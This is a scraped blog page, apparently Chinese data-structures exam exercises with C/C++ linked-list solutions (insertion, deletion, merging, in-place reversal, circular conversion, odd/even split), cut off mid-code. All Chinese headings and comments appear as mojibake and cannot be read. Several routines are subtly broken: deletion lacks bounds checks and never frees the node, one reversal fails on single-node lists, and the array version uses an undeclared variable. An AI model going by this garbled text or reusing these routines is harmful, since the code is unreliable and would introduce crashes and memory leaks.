å‰æ’å…¥ä¸€ä¸ªæ•´æ•°ã€‚-ä»0å¼€å§‹"><strong>2)   åœ¨è¯¥å•é“¾è¡¨çš„ç¬¬iä¸ªå…ƒç´ å‰æ’å…¥ä¸€ä¸ªæ•´æ•°ã€‚(ä»0å¼€å§‹)</strong></h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * åœ¨ å•é“¾è¡¨ ç¬¬xä¸ªä½ç½® å‰æ’å…¥y * @param  L [description] * @param  x [description] * @param  y [description] * @return   [description] */</span><span class="token keyword">void</span> <span class="token function">Add_before_X</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>s<span class="token punctuation">;</span>    p<span class="token operator">=</span>L<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">&amp;&amp;</span>j<span class="token operator">&lt;</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span>p<span class="token operator">-></span>next<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>p<span class="token operator">||</span>j<span class="token operator">></span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"error"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    s<span class="token operator">=</span>new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s<span class="token operator">-></span>data<span class="token operator">=</span>y<span class="token punctuation">;</span>    s<span class="token operator">-></span>next<span class="token operator">=</span>p<span class="token operator">-></span>next<span class="token punctuation">;</span>    p<span class="token operator">-></span>next<span class="token operator">=</span>s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="3-åˆ é™¤è¯¥å•é“¾è¡¨ä¸­çš„ç¬¬iä¸ªå…ƒç´ ï¼Œå…¶å€¼é€šè¿‡å‚æ•°å°†å…¶è¿”å›-ä»0å¼€å§‹-ã€‚">3)   åˆ é™¤è¯¥å•é“¾è¡¨ä¸­çš„ç¬¬iä¸ªå…ƒç´ ï¼Œå…¶å€¼é€šè¿‡å‚æ•°å°†å…¶è¿”å›(ä»0å¼€å§‹)ã€‚</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * åˆ é™¤å•é“¾è¡¨ä¸­ç¬¬iä¸ªå…ƒç´  çš„ç»“ç‚¹ * @param L [description] * @param i [description] */</span><span class="token keyword">void</span> <span class="token function">Delet_x</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist s<span class="token punctuation">,</span>p<span class="token punctuation">;</span>    p<span class="token operator">=</span>L<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">&amp;&amp;</span>j<span class="token operator">&lt;</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span>p<span class="token operator">-></span>next<span class="token punctuation">;</span>        j<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    i <span class="token operator">=</span> p<span class="token operator">-></span>data<span class="token punctuation">;</span>    s <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>    p<span class="token operator">-></span>next<span class="token operator">=</span>s<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="4-å»ºç«‹ä¸¤ä¸ªæŒ‰å€¼é€’å¢æœ‰åºçš„å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œå°†ä»–ä»¬åˆå¹¶æˆä¸€ä¸ªæŒ‰å€¼é€’å‡æœ‰åºçš„å•é“¾è¡¨ã€‚">4)   å»ºç«‹ä¸¤ä¸ªæŒ‰å€¼é€’å¢æœ‰åºçš„å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œå°†ä»–ä»¬åˆå¹¶æˆä¸€ä¸ªæŒ‰å€¼é€’å‡æœ‰åºçš„å•é“¾è¡¨ã€‚</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/*** æ€è·¯ï¼š å½’å¹¶ï¼Œ å¤´æ’æ³•*/</span>linklist <span class="token function">Union</span><span class="token punctuation">(</span>linklist la<span class="token punctuation">,</span>linklist lb<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>r<span class="token punctuation">,</span>rear<span class="token punctuation">,</span>t<span class="token punctuation">;</span>    p <span class="token operator">=</span> la<span class="token operator">-></span>next<span class="token punctuation">,</span>q <span class="token operator">=</span> lb<span class="token operator">-></span>next<span class="token punctuation">;</span>    la<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    r <span class="token operator">=</span> la<span class="token punctuation">;</span> <span class="token comment">// ré‡æ„la</span>    <span class="token keyword">while</span><span class="token punctuation">(</span> p <span class="token operator">&amp;&amp;</span> q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> p<span class="token operator">-></span>data <span class="token operator">&lt;</span> q<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            rear <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>            p<span class="token operator">-></span>next <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">;</span>            r<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>            p <span class="token operator">=</span> rear<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> p<span class="token operator">-></span>data <span class="token operator">></span> q<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            rear <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>            q<span class="token operator">-></span>next <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">;</span>            r<span class="token operator">-></span>next <span class="token operator">=</span> q<span class="token punctuation">;</span>            q <span class="token operator">=</span> rear<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å½“ä¸¤ä¸ªå€¼ç›¸åŒæ—¶,(æŒ‰é¢˜ç›®è¦æ±‚ä¸¤ä¸ªéƒ½ä¿ç•™, å¦å¤–ä¸€ä¸ªfreeæ‰)</span>            rear <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>            t <span class="token operator">=</span> p <span class="token operator">-></span>next<span class="token punctuation">;</span>            p<span class="token operator">-></span>next <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">;</span>            r<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>            q<span class="token operator">-></span>next <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">;</span>            r<span class="token operator">-></span>next <span class="token operator">=</span> q<span class="token punctuation">;</span>            <span class="token comment">// free(q);</span>           q <span class="token operator">=</span> rear<span class="token punctuation">;</span>            p <span class="token operator">=</span> t<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// å› ä¸ºæ˜¯å€’å™, æ‰€ä»¥å¿…é¡» é€æ­¥éå†å¤´æ’å‰©ä½™éƒ¨åˆ†</span>        rear <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        p<span class="token operator">-></span>next <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">;</span>        r<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>        p <span class="token operator">=</span> rear<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        rear <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>        q<span class="token operator">-></span>next <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">;</span>        r<span class="token operator">-></span>next <span class="token operator">=</span> q<span class="token punctuation">;</span>        q <span class="token operator">=</span> rear<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> la<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><hr><h3 id="plus-ä¸¤ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨A-B-åˆå¹¶æˆä¸€ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨C">plus-ä¸¤ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨A B åˆå¹¶æˆä¸€ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨C</h3><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * ä¸¤ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨A B åˆå¹¶æˆä¸€ä¸ªå•è°ƒé€’å¢æœ‰åºçš„å•é“¾è¡¨C * @param L [description] * @param B [description] */</span><span class="token keyword">void</span> <span class="token function">Merage_A_B</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>A<span class="token punctuation">,</span>linklist <span class="token operator">&amp;</span>B<span class="token punctuation">,</span>linklist <span class="token operator">&amp;</span>C<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>linklist pa<span class="token punctuation">,</span>pb<span class="token punctuation">,</span>pc<span class="token punctuation">;</span>pa <span class="token operator">=</span> A<span class="token operator">-></span>next<span class="token punctuation">;</span>pb <span class="token operator">=</span> B<span class="token operator">-></span>next<span class="token punctuation">;</span>pc <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pc <span class="token operator">-></span>next <span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>pa<span class="token operator">&amp;&amp;</span>pb<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pa<span class="token operator">-></span>data <span class="token operator">&lt;=</span> pb<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    pc<span class="token operator">-></span>next <span class="token operator">=</span> pa<span class="token punctuation">;</span>    pc <span class="token operator">=</span> pa<span class="token punctuation">;</span>    pa <span class="token operator">=</span> pa<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    pc <span class="token operator">-></span>next <span class="token operator">=</span> pb<span class="token punctuation">;</span>    pc <span class="token operator">=</span> pb<span class="token punctuation">;</span>    pb <span class="token operator">=</span> pb<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// å°¾æ’</span>pc <span class="token operator">-></span>next <span class="token operator">=</span> pa<span class="token operator">?</span> pa<span class="token operator">:</span>pb<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="5-è¯•ç¼–å†™ç®—æ³•å°†å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨å°±åœ°é€†ç½®ï¼Œæ‰€è°“â€œå°±åœ°â€æ˜¯æŒ‡è¾…åŠ©ç©ºé—´å¤æ‚åº¦ä¸ºO-1-ã€‚-è®¡-æœŸæœ«-10-1">5)   è¯•ç¼–å†™ç®—æ³•å°†å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨å°±åœ°é€†ç½®ï¼Œæ‰€è°“â€œå°±åœ°â€æ˜¯æŒ‡è¾…åŠ©ç©ºé—´å¤æ‚åº¦ä¸ºO(1)ã€‚ (è®¡.æœŸæœ«.10.1)</h2><div class="story post-story"><p>å¤´æ’é‡æ–°å»ºè¡¨</p><img src="https://gitee.com/sizaif/images/raw/master/img/20201111233325.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20201111233325.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201111233325409" style="zoom:50%;" /><p>æŒ‡é’ˆåè½¬</p><img src="https://gitee.com/sizaif/images/raw/master/img/20201111233350.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20201111233350.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201111233350810" style="zoom:50%;" /><p>é¡ºåºå­˜å‚¨ æ•°ç»„</p><img src="https://gitee.com/sizaif/images/raw/master/img/20201111233416.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20201111233416.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201111233416308" style="zoom:50%;" /><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">//æ³•ä¸€ï¼šå¤´æ’æ³•ä»æ–°å»ºè¡¨</span><span class="token keyword">void</span> <span class="token function">reverse</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>rear<span class="token punctuation">;</span> <span class="token comment">// rear ä¸ºpçš„åç»§ é˜²æ­¢æ–­é“¾</span>    p <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span>    L<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// å¤´ç»“ç‚¹çš„Next ç½®ä¸ºnull</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        rear <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token comment">//  å¤´æ’æ³•</span>        p<span class="token operator">-></span>next <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span>        L<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>        p <span class="token operator">=</span> rear<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//æ³•äºŒï¼šæŒ‡é’ˆåè½¬</span><span class="token keyword">void</span> <span class="token function">reverse</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    LinkList temp<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">;</span>    temp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    p <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span>    q <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>q<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// æš‚å­˜q-Next</span>        q<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment">// æŒ‡é’ˆé€†ç½®</span>        p <span class="token operator">=</span> q<span class="token punctuation">;</span> <span class="token comment">// å¾€åç§»</span>        q <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    L<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// ç¬¬ä¸€ä¸ªç»“ç‚¹å˜æˆæœ€åä¸€ä¸ªç»“ç‚¹</span>    L<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment">// æœ€åä¸€ä¸ªç»“ç‚¹å˜æˆç¬¬ä¸€ä¸ªç»“ç‚¹</span><span class="token punctuation">&#125;</span><span class="token comment">//æ³•ä¸‰ï¼š é¡ºåºå­˜å‚¨ æ•°ç»„</span><span class="token keyword">void</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token keyword">int</span> A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token operator">/</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>n<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        A<span class="token punctuation">[</span>n<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="6-å°†ä¸€ä¸ªå¤´æŒ‡é’ˆä¸ºheadä¸”ä¸å¸¦å¤´èŠ‚ç‚¹çš„å•é“¾è¡¨æ”¹é€ ä¸ºä¸€ä¸ªå«å¤´èŠ‚ç‚¹ä¸”å¤´æŒ‡é’ˆä¸ºheadçš„å•å¾ªç¯é“¾è¡¨-è®¡-æœŸæœ«-09-1">6)   å°†ä¸€ä¸ªå¤´æŒ‡é’ˆä¸ºheadä¸”ä¸å¸¦å¤´èŠ‚ç‚¹çš„å•é“¾è¡¨æ”¹é€ ä¸ºä¸€ä¸ªå«å¤´èŠ‚ç‚¹ä¸”å¤´æŒ‡é’ˆä¸ºheadçš„å•å¾ªç¯é“¾è¡¨ (è®¡.æœŸæœ«.09.1)</h2><div class="story post-story"><img src="https://gitee.com/sizaif/images/raw/master/img/20201111233456.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20201111233456.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201111233456163" style="zoom: 67%;" /><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">//æ²¡æœ‰å•å¾ªç¯-> head->next = head; æ”¹é€ ä¸ºå¸¦å¤´ç»“ç‚¹çš„</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span>LinkList <span class="token operator">&amp;</span>head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    LinkList p<span class="token punctuation">;</span>    p <span class="token operator">=</span> new <span class="token function">LinkNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        head <span class="token operator">=</span> p<span class="token punctuation">;</span>        p<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment">// å•å¾ªç¯</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        p<span class="token operator">-></span>next <span class="token operator">=</span> head<span class="token punctuation">;</span> <span class="token comment">// åˆ›é€ å¤´ç»“ç‚¹</span>        <span class="token comment">// å•å¾ªç¯åˆ—è¡¨</span>        Linklist t <span class="token operator">=</span>  head<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>t<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            t <span class="token operator">=</span> t<span class="token operator">-></span>next<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>        t<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment">// æœ€åä¸€ä¸ªç»“ç‚¹æŒ‡å‘å¤´ç»“ç‚¹</span>        head <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment">// å°†p èµ‹ç»™ head å˜æˆheadé“¾è¡¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="7-å‡è®¾æœ‰ä¸¤ä¸ªæŒ‰å…ƒç´ å€¼é€’å¢æ¬¡åºæ’åˆ—çš„çº¿æ€§è¡¨ï¼Œå‡ä¸å¸¦å¤´ç»“ç‚¹ä»¥å•é“¾è¡¨å½¢å¼å­˜å‚¨ã€‚è¯·ç¼–å†™ç®—æ³•å°†è¿™ä¸¤ä¸ªå•é“¾è¡¨å½’å¹¶ä¸ºä¸€ä¸ªæŒ‰å…ƒç´ å€¼é€’å‡-éé€’å‡-æ¬¡åºæ’åˆ—çš„å•é“¾è¡¨ï¼Œå¹¶è¦æ±‚åˆ©ç”¨åŸæ¥ä¸¤ä¸ªå•é“¾è¡¨çš„ç»“ç‚¹å­˜æ”¾å½’å¹¶åçš„å•é“¾è¡¨-è®¡-æœŸæœ«-08-2">7)   å‡è®¾æœ‰ä¸¤ä¸ªæŒ‰å…ƒç´ å€¼é€’å¢æ¬¡åºæ’åˆ—çš„çº¿æ€§è¡¨ï¼Œ<strong>å‡ä¸å¸¦å¤´ç»“ç‚¹</strong>ä»¥å•é“¾è¡¨å½¢å¼å­˜å‚¨ã€‚è¯·ç¼–å†™ç®—æ³•å°†è¿™ä¸¤ä¸ªå•é“¾è¡¨å½’å¹¶ä¸ºä¸€ä¸ªæŒ‰å…ƒç´ å€¼é€’å‡(éé€’å‡)æ¬¡åºæ’åˆ—çš„å•é“¾è¡¨ï¼Œå¹¶è¦æ±‚åˆ©ç”¨åŸæ¥ä¸¤ä¸ªå•é“¾è¡¨çš„ç»“ç‚¹å­˜æ”¾å½’å¹¶åçš„å•é“¾è¡¨ (è®¡.æœŸæœ«.08.2) !!!</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c">linklist <span class="token function">merge_without_Head</span><span class="token punctuation">(</span>linklist la<span class="token punctuation">,</span>linklist lb<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>linklist lc <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>lce <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>la <span class="token operator">&amp;&amp;</span> lb<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> la<span class="token operator">-></span>data <span class="token operator">&lt;=</span> lb<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>lc<span class="token punctuation">)</span> lc <span class="token operator">=</span> la<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    lce<span class="token operator">-></span>next <span class="token operator">=</span> la<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    lce <span class="token operator">=</span> la<span class="token punctuation">;</span>    la <span class="token operator">=</span> la<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>lc<span class="token punctuation">)</span> lc <span class="token operator">=</span> lb<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    lce<span class="token operator">-></span>next <span class="token operator">=</span> lb<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    lce <span class="token operator">=</span> lb<span class="token punctuation">;</span>    lb <span class="token operator">=</span> lb<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>lc<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>la<span class="token punctuation">)</span> lce <span class="token operator">-></span>next <span class="token operator">=</span> la<span class="token punctuation">;</span><span class="token keyword">else</span>lce <span class="token operator">-></span>next <span class="token operator">=</span> lb<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>la <span class="token punctuation">)</span> lc <span class="token operator">=</span> la<span class="token punctuation">;</span><span class="token keyword">else</span>lc <span class="token operator">=</span> lb<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> lc<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="8-ç»™å®šä¸€ä¸ªå¸¦è¡¨å¤´ç»“ç‚¹çš„å•é“¾è¡¨Aåˆ†è§£ä¸ºä¸¤ä¸ªå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Aå’ŒBï¼Œä½¿å¾—Aè¡¨ä¸­å«æœ‰åŸè¡¨ä¸­åºå·ä¸ºå¥‡æ•°çš„å…ƒç´ ï¼Œè€ŒBè¡¨ä¸­å«æœ‰åŸè¡¨ä¸­åºå·ä¸ºå¶æ•°çš„å…ƒç´ ï¼Œä¸”ä¿æŒå…¶ç›¸å¯¹é¡ºåºä¸å˜">8)   ç»™å®šä¸€ä¸ªå¸¦è¡¨å¤´ç»“ç‚¹çš„å•é“¾è¡¨Aåˆ†è§£ä¸ºä¸¤ä¸ªå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Aå’ŒBï¼Œä½¿å¾—Aè¡¨ä¸­å«æœ‰åŸè¡¨ä¸­åºå·ä¸ºå¥‡æ•°çš„å…ƒç´ ï¼Œè€ŒBè¡¨ä¸­å«æœ‰åŸè¡¨ä¸­åºå·ä¸ºå¶æ•°çš„å…ƒç´ ï¼Œä¸”ä¿æŒå…¶ç›¸å¯¹é¡ºåºä¸å˜</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token keyword">void</span> <span class="token function">div</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>A<span class="token punctuation">,</span>linklist <span class="token operator">&amp;</span>B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>linklist p<span class="token punctuation">,</span>pc<span class="token punctuation">,</span>pb<span class="token punctuation">,</span>temp<span class="token punctuation">,</span>Lc<span class="token punctuation">;</span>    p <span class="token operator">=</span> A<span class="token operator">-></span>next<span class="token punctuation">;</span>    Lc <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Lc<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    pc <span class="token operator">=</span> Lc<span class="token punctuation">;</span>    pb <span class="token operator">=</span> B<span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    temp <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// ä¿å­˜åç»§é˜²æ­¢æ–­é“¾</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">//å°¾æ’</span>            p<span class="token operator">-></span>next <span class="token operator">=</span> pc<span class="token operator">-></span>next<span class="token punctuation">;</span>            pc<span class="token operator">-></span>next <span class="token operator">=</span> 